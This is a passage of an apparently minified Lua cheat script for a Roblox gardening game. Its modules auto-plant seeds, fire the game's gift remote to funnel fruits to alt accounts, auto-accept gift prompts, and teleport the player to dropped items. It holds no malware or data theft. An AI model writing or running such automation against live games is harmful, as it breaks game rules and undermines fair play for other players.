		Z.AdvancedIncomeFarm.LastFruitReserveStageAdvancedIncomeFarm = V
		Z.AdvancedIncomeFarm.LastFruitReserveWeatherAdvancedIncomeFarm = y
		return i
	end,
	ShouldHoldFruitAdvancedIncomeFarm = function(G)
		if not Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm() or type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or G.n or "")
		local y = Z.AdvancedIncomeFarm.GetCatalogInfoAdvancedIncomeFarm(V)
		if V == "" or type(y) ~= "table" then
			return false
		end
		local j, i, c = Z.FruitFilters.GetMutationLookup(G)
		local J = Z.FruitFilters.GetFruitVariant(G, i)
		if tostring(c or "") ~= "" or J ~= "Normal" then
			return false
		end
		local T = tonumber(G.w) or 0
		if T < 4.5 then
			return false
		end
		local d = g.RarityRank[tostring(G.r or y.rarity or g.SeedRarity[V] or "")] or 0
		local u = g.RarityRank.Legendary or 5
		if V == "Mushroom" or d >= u then
			return true
		end
		local q = g.RarityRank.Epic or 4
		if d == q and T >= 20 then
			return true
		end
		if y.goodSingle then
			return true
		end
		if y.single then
			return false
		end
		local E = Z.AdvancedIncomeFarm.GetLiveSnapshotAdvancedIncomeFarm()
		if type(E) ~= "table" or E.mutationWeatherActive ~= true then
			return false
		end
		local a = Z.AdvancedIncomeFarm.GetFruitReserveLookupAdvancedIncomeFarm(E)
		local H = Z.TotalControl.GetFruitWaitKeyTotalControl(G)
		return H ~= "" and a[H] == true
	end,
	RunAdvancedIncomeFarm = function()
		if not Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm() then
			return false
		end
		if Z.AdvancedIncomeFarm.BusyAdvancedIncomeFarm then
			return false
		end
		Z.TotalControl.SetStatusTotalControl("Using advanced income farm", "#66CCFF")
		if not q.IsLoadingCompleted() then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Advanced | Waiting for garden load", "#FFCC66")
			return false
		end
		if not Z.SmartSeedProgression.GardenDataReadySmartSeedProgression() then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Advanced | Waiting for garden data", "#FFCC66")
			return false
		end
		local G = Z.AdvancedIncomeFarm.BuildSnapshotAdvancedIncomeFarm()
		if type(G) ~= "table" then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Advanced data unavailable", "#FF6666")
			return false
		end
		local V, y = Z.AdvancedIncomeFarm.GetCandidatesAdvancedIncomeFarm(G, false)
		if # V == 0 and G.totalCount < G.capacity then
			V = Z.AdvancedIncomeFarm.GetCandidatesAdvancedIncomeFarm(G, true)
		end
		if # V == 0 then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("%s | Waiting for eligible seeds", G.stageName), "#FFCC66", string.format("advanced=true | owned=%d | garden=%d/%d", # ((y or {})), G.totalCount, G.capacity))
			return false
		end
		Z.AdvancedIncomeFarm.BusyAdvancedIncomeFarm = true
		local j, i = pcall(function()
			if G.totalCount < G.capacity then
				return Z.AdvancedIncomeFarm.PlantCandidatesAdvancedIncomeFarm(V, G)
			end
			return Z.AdvancedIncomeFarm.ReplaceWorstPlantAdvancedIncomeFarm(V, G)
		end)
		Z.AdvancedIncomeFarm.BusyAdvancedIncomeFarm = false
		if not j then
			Z.Player.UnequipTools()
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Advanced income farm error", "#FF4444")
			warn("[AdvancedIncomeFarm]", i)
			return false
		end
		return i == true
	end
}
g.GiftSystemStatusText = ""
g.GiftSystemUi = g.GiftSystemUi or {}
Z.GiftSystem = {
	StartedGiftSystem = false,
	SenderBusyGiftSystem = false,
	DropBusyGiftSystem = false;
	LastSendAtGiftSystem = 0;
	PlayerConnectionsGiftSystem = {},
	SetStatusGiftSystem = function(G, V)
		if type(G) ~= "string" or G == "" then
			g.GiftSystemStatusText = ""
			return false
		end
		g.GiftSystemStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\142\129 [Gift]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	ClearStatusGiftSystem = function()
		g.GiftSystemStatusText = ""
	end,
	GetModeValuesGiftSystem = function()
		return {
			"Trusted Only";
			"Anyone"
		}
	end,
	GetSendOrderValuesGiftSystem = function()
		return {
			"Lowest Weight First";
			"Highest Weight First",
			"Name A-Z",
			"Mutation First";
			"Normal First"
		}
	end,
	GetDropCategoryValuesGiftSystem = function()
		return {
			"HarvestedFruits",
			"Seeds",
			"Sprinklers";
			"WateringCans",
			"Mushrooms",
			"Gnomes";
			"Raccoons",
			"Crates";
			"Teleporters",
			"Magnets",
			"FruitMagnets",
			"PetTeleporters",
			"SeedPacks";
			"Wheelbarrows",
			"Trowels";
			"Crowbars",
			"Ladders",
			"FreezeRays",
			"PowerHoses",
			"Rakes",
			"Signs";
			"EmptyPots",
			"Flashbangs",
			"Birds",
			"Pets"
		}
	end;
	GetSelectionValuesGiftSystem = function(G)
		local V = {}
		local y = {}
		local function Z(G)
			G = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
			if G == "" or y[G] then
				return false
			end
			y[G] = true
			table.insert(V, G)
			return true
		end
		if type(G) ~= "table" then
			return V
		end
		for G, V in pairs(G) do
			if type(G) == "number" then
				Z(V)
			elseif V ~= nil and V ~= false then
				Z(G)
			elseif type(V) == "string" then
				Z(V)
			end
		end
		return V
	end,
	GetPlayerDropdownGiftSystem = function(G, V)
		local j = {}
		local i = {}
		for V, Z in ipairs(y.Players:GetPlayers()) do
			if G and Z == y.LocalPlayer then
				continue
			end
			local c = tostring(Z.UserId or "")
			local J = tostring(Z.Name or "")
			if c ~= "" and J ~= "" then
				i[c] = true
				i[J] = true
				table.insert(j, {
					Text = string.format("%s <font color=\'#888888\'>(%s)</font>", J, c);
					Value = c
				})
			end
		end
		for G, V in ipairs(Z.GiftSystem.GetSelectionValuesGiftSystem(V)) do
			if not i[V] then
				table.insert(j, {
					Text = string.format("Saved player <font color=\'#888888\'>(%s)</font>", V),
					Value = V
				})
			end
		end
		table.sort(j, function(G, V)
			return tostring(G.Text or "") < tostring(V.Text or "")
		end)
		return j
	end,
	IsSelectedGiftSystem = function(G, V)
		if Z.FruitFilters and type(Z.FruitFilters.IsSelected) == "function" then
			return Z.FruitFilters.IsSelected(G, V)
		end
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] ~= nil and G[V] ~= false then
			return true
		end
		for G, y in pairs(G) do
			if type(G) == "number" and tostring(y or "") == V then
				return true
			end
			if tostring(G or "") == V and (y ~= nil and y ~= false) then
				return true
			end
		end
		return false
	end;
	IsSelectionEmptyGiftSystem = function(G)
		if Z.FruitFilters and type(Z.FruitFilters.IsSelectionEmpty) == "function" then
			return Z.FruitFilters.IsSelectionEmpty(G)
		end
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V ~= nil and (V ~= false and tostring(V) ~= "") then
				return false
			end
		end
		return true
	end,
	GetSelectedPlayerGiftSystem = function(G)
		if type(G) ~= "table" then
			return nil
		end
		for V, j in ipairs(y.Players:GetPlayers()) do
			if j ~= y.LocalPlayer then
				local V = tostring(j.UserId or "")
				local y = tostring(j.Name or "")
				if Z.GiftSystem.IsSelectedGiftSystem(G, V) or Z.GiftSystem.IsSelectedGiftSystem(G, y) then
					return j
				end
			end
		end
		return nil
	end,
	BuildBackpackFruitDataGiftSystem = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		local V = G:IsA("Tool") and G:GetAttribute("HarvestedFruit") == true
		local y = G:IsA("Configuration") and (G:GetAttribute("FruitProxy") == true and G:GetAttribute("HarvestedFruit") == true)
		if not V and not y then
			return nil
		end
		local j = Z.SellManager and (Z.SellManager.BuildBackpackFruitData and Z.SellManager.BuildBackpackFruitData(G)) or nil
		if type(j) ~= "table" then
			return nil
		end
		j.ob = G
		j.id = tostring(j.id or G:GetAttribute("Id") or "")
		j.name = tostring(j.name or j.n or G:GetAttribute("FruitName") or G:GetAttribute("Fruit") or "")
		j.n = j.name
		if j.id == "" or j.name == "" then
			return nil
		end
		local i, c = Z.FruitFilters.GetMutationLookup(j)
		j.v = Z.FruitFilters.GetFruitVariant(j, c)
		return j
	end,
	IsFavouriteFruitGiftSystem = function(G)
		local V = type(G) == "table" and G.ob or nil
		if typeof(V) ~= "Instance" then
			return false
		end
		return V:GetAttribute("IsFavorite") == true or V:GetAttribute("Favorite") == true or V:GetAttribute("Favourite") == true or V:GetAttribute("Favorited") == true or V:GetAttribute("Favourited") == true
	end,
	GetBackpackFruitsGiftSystem = function()
		local G = {}
		for V, y in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local j = Z.GiftSystem.BuildBackpackFruitDataGiftSystem(y)
			if j then
				table.insert(G, j)
			end
		end
		return G
	end,
	GetFruitCountsGiftSystem = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and G or {}) do
			local Z = tostring(y.name or y.n or "")
			if Z ~= "" then
				V[Z] = ((V[Z] or 0)) + 1
			end
		end
		return V
	end;
	PassesFruitFiltersGiftSystem = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or G.n or "")
		if V == "" or tostring(G.id or "") == "" then
			return false
		end
		if h.gift_protect_favourites and Z.GiftSystem.IsFavouriteFruitGiftSystem(G) then
			return false
		end
		if not Z.FruitFilters.IsSelectionEmpty(h.gift_fruit_list) then
			if not Z.FruitFilters.IsSelected(h.gift_fruit_list, V) then
				return false
			end
		end
		if G.has_weight == false or tonumber(G.w) == nil or ((tonumber(G.w) or 0)) <= 0 then
			return false
		end
		if not Z.FruitFilters.PassesWeightRange(G.w, h.gift_min_weight, h.gift_max_weight) then
			return false
		end
		local y, j = Z.FruitFilters.GetMutationLookup(G)
		if not Z.FruitFilters.PassesMutationSelection(j, h.gift_mutation_whitelist, h.gift_mutation_blacklist) then
			return false
		end
		local i = Z.FruitFilters.GetFruitVariant(G, j)
		if not Z.FruitFilters.PassesVariantSelection(i, h.gift_variant_whitelist, h.gift_variant_blacklist) then
			return false
		end
		return true
	end;
	SortFruitsGiftSystem = function(G)
		local V = tostring(h.gift_send_order or "Lowest Weight First")
		table.sort(G, function(G, y)
			local Z = tonumber(G.w) or 0
			local j = tonumber(y.w) or 0
			if V == "Highest Weight First" then
				if Z ~= j then
					return Z > j
				end
			elseif V == "Name A-Z" then
				if tostring(G.name or "") ~= tostring(y.name or "") then
					return tostring(G.name or "") < tostring(y.name or "")
				end
			elseif V == "Mutation First" then
				local V = tostring(G.m or "") ~= ""
				local Z = tostring(y.m or "") ~= ""
				if V ~= Z then
					return V
				end
			elseif V == "Normal First" then
				local V = tostring(G.v or "Normal") == "Normal"
				local Z = tostring(y.v or "Normal") == "Normal"
				if V ~= Z then
					return V
				end
			else
				if Z ~= j then
					return Z < j
				end
			end
			return tostring(G.id or "") < tostring(y.id or "")
		end)
	end;
	GetFilteredFruitsGiftSystem = function()
		local G = Z.GiftSystem.GetBackpackFruitsGiftSystem()
		local V = {}
		local y = Z.GiftSystem.GetFruitCountsGiftSystem(G)
		local j = {}
		local i = math.max(math.floor(tonumber(h.gift_keep_amount_per_fruit) or 0), 0)
		Z.GiftSystem.SortFruitsGiftSystem(G)
		for G, c in ipairs(G) do
			if not Z.GiftSystem.PassesFruitFiltersGiftSystem(c) then
				continue
			end
			local J = tostring(c.name or c.n or "")
			local T = y[J] or 0
			local d = j[J] or 0
			if i > 0 and d >= math.max(T - i, 0) then
				continue
			end
			j[J] = d + 1
			table.insert(V, c)
		end
		return V, # G
	end,
	FruitStillExistsGiftSystem = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		for V, y in ipairs(Z.GiftSystem.GetBackpackFruitsGiftSystem()) do
			if tostring(y.id or "") == G then
				return true
			end
		end
		return false
	end,
	WaitForFruitGoneGiftSystem = function(G, V)
		G = tostring(G or "")
		V = math.max(tonumber(V) or 8, 1)
		if G == "" then
			return false
		end
		local y = os.clock()
		repeat
			if not Z.GiftSystem.FruitStillExistsGiftSystem(G) then
				return true
			end
			task.wait(.2)
		until os.clock() - y >= V
		return false
	end;
	SendFruitGiftSystem = function(G, V)
		if not G or not G:IsDescendantOf(y.Players) then
			return false, "Target left server"
		end
		if type(V) ~= "table" or tostring(V.id or "") == "" then
			return false, "Invalid fruit"
		end
		local j = y.Networking and (y.Networking.Gifting and y.Networking.Gifting.Send)
		if not j or type(j.Fire) ~= "function" then
			return false, "Gift remote missing"
		end
		if h.gift_preview_only then
			return true, "Preview"
		end
		local i = V.ob
		if typeof(i) == "Instance" and i.Parent then
			Z.Player.EquipTool(i)
			task.wait(.1)
		end
		local c, J = pcall(function()
			j:Fire(G.UserId, "HarvestedFruits", tostring(V.id))
		end)
		if not c then
			return false, tostring(J or "Gift failed")
		end
		if not Z.GiftSystem.WaitForFruitGoneGiftSystem(V.id, h.gift_wait_timeout) then
			return false, "Not accepted yet"
		end
		return true, "Sent"
	end;
	ProcessSenderGiftSystem = function()
		if not h.gift_send_enabled then
			return false
		end
		if Z.GiftSystem.SenderBusyGiftSystem then
			return false
		end
		if not q.IsLoadingCompleted() then
			Z.GiftSystem.SetStatusGiftSystem("Waiting for loading", "#FFCC66")
			return false
		end
		local G = math.clamp(tonumber(h.gift_delay) or 1.25, .35, 30)
		if os.clock() - Z.GiftSystem.LastSendAtGiftSystem < G then
			return false
		end
		local V = Z.GiftSystem.GetSelectedPlayerGiftSystem(h.gift_send_targets)
		if not V then
			Z.GiftSystem.SetStatusGiftSystem("Waiting for selected alt", "#FFCC66")
			return false
		end
		local y, j = Z.GiftSystem.GetFilteredFruitsGiftSystem()
		local i = math.max(math.floor(tonumber(h.gift_only_when_backpack_over) or 0), 0)
		if i > 0 and j <= i then
			Z.GiftSystem.SetStatusGiftSystem("Paused: backpack below limit", "#CFCFCF")
			return false
		end
		if # y == 0 then
			Z.GiftSystem.SetStatusGiftSystem("No fruits match filters", "#FFCC66")
			return false
		end
		local c = math.clamp(math.floor(tonumber(h.gift_max_per_cycle) or 1), 1, 25)
		Z.GiftSystem.SenderBusyGiftSystem = true
		local J, T = pcall(function()
			local j = 0
			local i = 0
			for y, J in ipairs(y) do
				if j >= c then
					break
				end
				if not h.gift_send_enabled then
					break
				end
				local T = Z.GiftSystem.BuildBackpackFruitDataGiftSystem(J.ob)
				if not T or not Z.GiftSystem.PassesFruitFiltersGiftSystem(T) then
					continue
				end
				i += 1
				local d, u = Z.GiftSystem.SendFruitGiftSystem(V, T)
				if d then
					j += 1
					Z.GiftSystem.SetStatusGiftSystem(string.format("%s %s to %s", tostring(u), tostring(T.name), V.Name), h.gift_preview_only and "#CFCFCF" or "#66FF99")
				else
					Z.GiftSystem.SetStatusGiftSystem(tostring(u or "Gift failed"), "#FF6666")
					break
				end
				Z.GiftSystem.LastSendAtGiftSystem = os.clock()
				task.wait(G)
			end
			if j == 0 and i == 0 then
				Z.GiftSystem.SetStatusGiftSystem("No safe fruit ready", "#FFCC66")
			end
			return j
		end)
		Z.GiftSystem.SenderBusyGiftSystem = false
		if not J then
			Z.GiftSystem.SetStatusGiftSystem("Sender error", "#FF6666")
			warn("[GiftSystem Sender]", T)
			return false
		end
		return T and T > 0
	end;
	IsTrustedGiftSenderGiftSystem = function(G)
		if not G or not G:IsDescendantOf(y.Players) then
			return false
		end
		local V = tostring(h.gift_receive_mode or "Trusted Only")
		if V == "Anyone" then
			return true
		end
		local j = tostring(G.UserId or "")
		local i = tostring(G.Name or "")
		return Z.GiftSystem.IsSelectedGiftSystem(h.gift_receive_trusted, j) or Z.GiftSystem.IsSelectedGiftSystem(h.gift_receive_trusted, i)
	end;
	CanAcceptItemNameGiftSystem = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		if Z.GiftSystem.IsSelectionEmptyGiftSystem(h.gift_receive_item_whitelist) then
			return true
		end
		return Z.GiftSystem.IsSelectedGiftSystem(h.gift_receive_item_whitelist, G)
	end;
	HideGiftPromptGiftSystem = function()
		local G = y.PlayerGui
		local V = G and G:FindFirstChild("Gifting")
		if V then
			V.Enabled = false
		end
	end;
	ProcessPromptGiftSystem = function(G, V)
		if not h.gift_receive_enabled then
			return false
		end
		if not Z.GiftSystem.IsTrustedGiftSenderGiftSystem(G) then
			Z.GiftSystem.SetStatusGiftSystem("Ignored gift from untrusted player", "#FFCC66")
			return false
		end
		if not Z.GiftSystem.CanAcceptItemNameGiftSystem(V) then
			Z.GiftSystem.SetStatusGiftSystem("Ignored gift item", "#FFCC66")
			return false
		end
		local j = y.Networking and (y.Networking.Gifting and y.Networking.Gifting.Response)
		if not j or type(j.Fire) ~= "function" then
			Z.GiftSystem.SetStatusGiftSystem("Accept remote missing", "#FF6666")
			return false
		end
		task.spawn(function()
			task.wait(.15)
			local V, y = pcall(function()
				j:Fire(G, true)
			end)
			if V then
				Z.GiftSystem.HideGiftPromptGiftSystem()
				Z.GiftSystem.SetStatusGiftSystem("Accepted from " .. tostring(G.Name or "player"), "#66FF99")
			else
				Z.GiftSystem.SetStatusGiftSystem("Accept failed", "#FF6666")
				warn("[GiftSystem Receiver]", y)
			end
		end)
		return true
	end,
	IsAllowedDropSourceGiftSystem = function(G)
		if not G or G.Parent ~= y.DroppedItems then
			return false
		end
		local V = tostring(h.gift_drop_pickup_mode or "Trusted Only")
		if V == "Anyone" then
			return true
		end
		local j = tostring(G:GetAttribute("DroppedBy") or "")
		if j == "" then
			return false
		end
		return Z.GiftSystem.IsSelectedGiftSystem(h.gift_drop_pickup_from, j)
	end,
	IsAllowedDropCategoryGiftSystem = function(G)
		if not G or G.Parent ~= y.DroppedItems then
			return false
		end
		local V = tostring(G:GetAttribute("ItemCategory") or "")
		if V == "" then
			return false
		end
		if Z.GiftSystem.IsSelectionEmptyGiftSystem(h.gift_drop_pickup_categories) then
			return false
		end
		return Z.GiftSystem.IsSelectedGiftSystem(h.gift_drop_pickup_categories, V)
	end;
	ClaimDroppedItemGiftSystem = function(G)
		if not h.gift_drop_pickup_enabled or Z.GiftSystem.DropBusyGiftSystem then
			return false
		end
		if not Z.GiftSystem.IsAllowedDropCategoryGiftSystem(G) or not Z.GiftSystem.IsAllowedDropSourceGiftSystem(G) then
			return false
		end
		local V = Z.ProximityPrompt.FindProximityPromptByClass(G)
		if not V or not V.Enabled then
			return false
		end
		Z.GiftSystem.DropBusyGiftSystem = true
		local y = g.TeleportLockNames.GiftDropPickup
		local j = Z.Teleport.LockTeleport(y, h.gift_drop_pickup_use_player_walk and 35 or 2, h.gift_drop_pickup_use_player_walk == true)
		if not j then
			Z.GiftSystem.DropBusyGiftSystem = false
			return false
		end
		local i, c = pcall(function()
			if h.gift_drop_pickup_use_player_walk then
				if not Z.Movement.WalkPathToTarget(G, 30, y, 10) then
					return false
				end
			else
				if not Z.Teleport.TeleportTo(G, true, y) then
					return false
				end
			end
			task.wait(.05)
			if not V.Parent or not Z.GiftSystem.IsAllowedDropCategoryGiftSystem(G) or not Z.GiftSystem.IsAllowedDropSourceGiftSystem(G) then
				return false
			end
			Z.ProximityPrompt.ActivateProximityPrompt(V)
			Z.GiftSystem.SetStatusGiftSystem("Picked dropped item", "#66FF99")
			return true
		end)
		Z.Teleport.UnlockTeleport(y)
		Z.GiftSystem.DropBusyGiftSystem = false
		if not i then
			Z.GiftSystem.SetStatusGiftSystem("Drop pickup failed", "#FF6666")
			warn("[GiftSystem Drop]", c)
			return false
		end
		return c == true
	end;
	RefreshPlayerDropdownsGiftSystem = function()
		if g.GiftSystemUi.SendTargetsDropdown then
			g.GiftSystemUi.SendTargetsDropdown:SetValues(Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_send_targets))
			g.GiftSystemUi.SendTargetsDropdown:SetValue(h.gift_send_targets, true)
		end
		if g.GiftSystemUi.ReceiveTrustedDropdown then
			g.GiftSystemUi.ReceiveTrustedDropdown:SetValues(Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_receive_trusted))
			g.GiftSystemUi.ReceiveTrustedDropdown:SetValue(h.gift_receive_trusted, true)
		end
		if g.GiftSystemUi.DropTrustedDropdown then
			g.GiftSystemUi.DropTrustedDropdown:SetValues(Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_drop_pickup_from))
			g.GiftSystemUi.DropTrustedDropdown:SetValue(h.gift_drop_pickup_from, true)
		end
	end,
	UiGiftSystem = function(G)
		if not G then
			return false
		end
		local V = G:AddLeftGroupbox("Fruit Gift", "gift")
		local y = G:AddLeftGroupbox("Gift Receiver", "badge-check")
		local j = G:AddRightGroupbox("Gift Drop Pickup", "package-check")
		if V then
			V:AddLabel({
				Text = "\240\159\142\129 Sends filtered backpack fruits to a selected server player. Keep Preview Only on until the list looks right.";
				DoesWrap = true
			})
			g.GiftSystemUi.SendTargetsDropdown = V:AddValueDropdown("gift_send_targets_ui", {
				Values = Z.GiftSystem.GetPlayerDropdownGiftSystem(true, h.gift_send_targets);
				Default = {};
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 8,
				Text = "\240\159\145\164 Send To",
				Tooltip = "Select the alt or player that should receive fruits.",
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_send_targets = G
					a.Save.SaveDataSync()
				end
			})
			g.GiftSystemUi.SendTargetsDropdown:SetValue(h.gift_send_targets, true)
			local G
			G = V:AddValueDropdown("gift_fruit_list_ui", {
				Values = Z.SeedData.GetSeedDataListDropDown();
				Default = {};
				Multi = true;
				Searchable = true,
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\141\142 Fruits To Gift",
				Tooltip = "Empty allows all fruits that pass the filters.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_fruit_list = G
					a.Save.SaveDataSync()
				end
			})
			G:SetValue(h.gift_fruit_list)
			V:AddButton({
				Text = "\226\153\187\239\184\143 Refresh Players",
				Tooltip = "Refreshes server player lists.";
				Func = function()
					Z.GiftSystem.RefreshPlayerDropdownsGiftSystem()
				end
			})
			V:AddToggle("gift_preview_only_ui", {
				Text = "\240\159\145\128 Preview Only",
				Default = h.gift_preview_only,
				Tooltip = "Shows what would be gifted without sending fruits.";
				Callback = function(G)
					h.gift_preview_only = G
					a.Save.SaveDataSync()
				end
			})
			local y
			local j
			local function i(G)
				local V = f(G)
				if not V then
					V = tonumber(h.gift_min_weight) or 0
				end
				return string.format("\226\172\135\239\184\143 Min Gift %.2fKG", V)
			end
			local function c(G)
				local V = f(G)
				if not V then
					V = tonumber(h.gift_max_weight) or 89
				end
				return string.format("\226\172\134\239\184\143 Max Gift %.2fKG", V)
			end
			y = V:AddInput("gift_min_weight_ui", {
				Text = i(h.gift_min_weight),
				Default = tostring(h.gift_min_weight);
				Numeric = true,
				AllowEmpty = true,
				Finished = true,
				ClearTextOnFocus = false;
				Placeholder = "Press Enter to update",
				Tooltip = "Press Enter to update. Fruits below this KG will not be gifted.";
				Changed = function(G)
					if y then
						y:SetText(i(G))
					end
				end;
				Callback = function(G)
					local V = f(G)
					if not V or V < 0 then
						g.Notify("Invalid minimum gift KG", 3)
						y:SetValue(tostring(h.gift_min_weight))
						y:SetText(i(h.gift_min_weight))
						return
					end
					if V > ((tonumber(h.gift_max_weight) or 89)) then
						g.Notify("Minimum gift KG must be lower than maximum KG", 3)
						y:SetValue(tostring(h.gift_min_weight))
						y:SetText(i(h.gift_min_weight))
						return
					end
					h.gift_min_weight = Z.FruitFilters.RoundWeight(V)
					y:SetText(i(h.gift_min_weight))
					a.Save.SaveDataSync()
				end
			})
			j = V:AddInput("gift_max_weight_ui", {
				Text = c(h.gift_max_weight),
				Default = tostring(h.gift_max_weight),
				Numeric = true;
				AllowEmpty = true;
				Finished = true,
				ClearTextOnFocus = false,
				Placeholder = "Press Enter to update",
				Tooltip = "Press Enter to update. Fruits above this KG will not be gifted.",
				Changed = function(G)
					if j then
						j:SetText(c(G))
					end
				end,
				Callback = function(G)
					local V = f(G)
					if not V or V < 0 then
						g.Notify("Invalid maximum gift KG", 3)
						j:SetValue(tostring(h.gift_max_weight))
						j:SetText(c(h.gift_max_weight))
						return
					end
					if V < ((tonumber(h.gift_min_weight) or 0)) then
						g.Notify("Maximum gift KG must be higher than minimum KG", 3)
						j:SetValue(tostring(h.gift_max_weight))
						j:SetText(c(h.gift_max_weight))
						return
					end
					h.gift_max_weight = Z.FruitFilters.RoundWeight(V)
					j:SetText(c(h.gift_max_weight))
					a.Save.SaveDataSync()
				end
			})
			local J
			J = V:AddInput("gift_keep_amount_ui", {
				Text = "\240\159\148\146 Keep Per Fruit",
				Default = tostring(h.gift_keep_amount_per_fruit),
				Numeric = true,
				AllowEmpty = true;
				Finished = true;
				ClearTextOnFocus = false,
				Placeholder = "Amount to keep";
				Tooltip = "Keeps this many of each fruit name in backpack.";
				Callback = function(G)
					local V = z(G)
					if V == nil or V < 0 then
						g.Notify("Keep amount must be 0 or more", 3)
						J:SetValue(tostring(h.gift_keep_amount_per_fruit))
						return
					end
					h.gift_keep_amount_per_fruit = math.clamp(V, 0, 999)
					a.Save.SaveDataSync()
				end
			})
			local T
			T = V:AddInput("gift_max_per_cycle_ui", {
				Text = "\240\159\148\162 Max Per Cycle",
				Default = tostring(h.gift_max_per_cycle);
				Numeric = true,
				AllowEmpty = true,
				Finished = true;
				ClearTextOnFocus = false,
				Placeholder = "Fruits per cycle";
				Tooltip = "Maximum fruits gifted each cycle.";
				Callback = function(G)
					local V = z(G)
					if not V or V <= 0 then
						g.Notify("Max per cycle must be above 0", 3)
						T:SetValue(tostring(h.gift_max_per_cycle))
						return
					end
					h.gift_max_per_cycle = math.clamp(V, 1, 25)
					a.Save.SaveDataSync()
				end
			})
			local d
			d = V:AddInput("gift_delay_ui", {
				Text = "\226\143\177\239\184\143 Gift Delay",
				Default = tostring(h.gift_delay),
				Numeric = true;
				AllowEmpty = true,
				Finished = true,
				ClearTextOnFocus = false;
				Placeholder = "Seconds",
				Tooltip = "Delay between each fruit gift.";
				Callback = function(G)
					local V = f(G)
					if not V or V < .35 then
						g.Notify("Gift delay must be 0.35 or more", 3)
						d:SetValue(tostring(h.gift_delay))
						return
					end
					h.gift_delay = math.clamp(V, .35, 30)
					a.Save.SaveDataSync()
				end
			})
			local u
			u = V:AddDropdown("gift_send_order_ui", {
				Values = Z.GiftSystem.GetSendOrderValuesGiftSystem(),
				Default = h.gift_send_order;
				Multi = false;
				Text = "\226\134\149\239\184\143 Send Order",
				Tooltip = "Choose which matching fruits are sent first.";
				Callback = function(G)
					if type(G) ~= "string" or G == "" then
						return
					end
					h.gift_send_order = G
					a.Save.SaveDataSync()
				end
			})
			u:SetValue(h.gift_send_order)
			V:AddToggle("gift_protect_favourites_ui", {
				Text = "\226\173\144 Protect Favourites",
				Default = h.gift_protect_favourites,
				Tooltip = "Favourite fruits will not be gifted.";
				Callback = function(G)
					h.gift_protect_favourites = G
					a.Save.SaveDataSync()
				end
			})
			V:AddToggle("gift_send_enabled_ui", {
				Text = "\240\159\142\129 Enable Fruit Gift";
				Default = h.gift_send_enabled;
				Tooltip = "Automatically gifts backpack fruits that pass the filters.";
				Callback = function(G)
					h.gift_send_enabled = G
					if not G then
						Z.GiftSystem.SenderBusyGiftSystem = false
					end
					a.Save.SaveDataSync()
				end
			})
			V:AddDivider()
			local q
			q = V:AddValueDropdown("gift_mutation_whitelist_ui", {
				Values = Z.FruitFilters.GetMutationNames();
				Default = {};
				Multi = true;
				Text = "\226\156\133 Only Mutations",
				Tooltip = "Only gift fruits with selected mutations. Empty allows all mutations.";
				Searchable = true,
				MaxVisibleDropdownItems = 10,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_mutation_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			q:SetValue(h.gift_mutation_whitelist)
			local E
			E = V:AddValueDropdown("gift_mutation_blacklist_ui", {
				Values = Z.FruitFilters.GetMutationNames(),
				Default = {};
				Multi = true,
				Text = "\226\155\148 Protect Mutations";
				Tooltip = "Selected mutations will not be gifted.",
				Searchable = true;
				MaxVisibleDropdownItems = 10,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_mutation_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			E:SetValue(h.gift_mutation_blacklist)
			local H
			H = V:AddValueDropdown("gift_variant_whitelist_ui", {
				Values = Z.FruitFilters.GetVariantNames();
				Default = {};
				Multi = true;
				Text = "\226\156\133 Only Variants";
				Tooltip = "Only gift selected variants. Empty allows all variants.";
				Searchable = false,
				MaxVisibleDropdownItems = 5,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_variant_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			H:SetValue(h.gift_variant_whitelist)
			local r
			r = V:AddValueDropdown("gift_variant_blacklist_ui", {
				Values = Z.FruitFilters.GetVariantNames(),
				Default = {};
				Multi = true,
				Text = "\240\159\155\161\239\184\143 Protect Variants",
				Tooltip = "Selected variants will not be gifted.";
				Searchable = false;
				MaxVisibleDropdownItems = 5;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.gift_variant_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			r:SetValue(h.gift_variant_blacklist)
		end
		if y then
			y:AddLabel({
				Text = "\226\156\133 Auto accepts gift prompts. Trusted Only is safest for alts.",
				DoesWrap = true
			})
			local G
			G = y:AddDropdown("gift_receive_mode_ui", {
				Values = Z.GiftSystem.GetModeValuesGiftSystem();
				Default = h.gift_receive_mode,
				Multi = false,
				Text = "\240\159\155\161\239\184\143 Accept Mode";
				Tooltip = "Trusted Only accepts from selected users. Anyone accepts every gift prompt.",
				Callback = function(G)
					if type(G) ~= "string" or G == "" then
						return
					end
					h.gift_receive_mode = G
					a.Save.SaveDataSync()
				end
			})
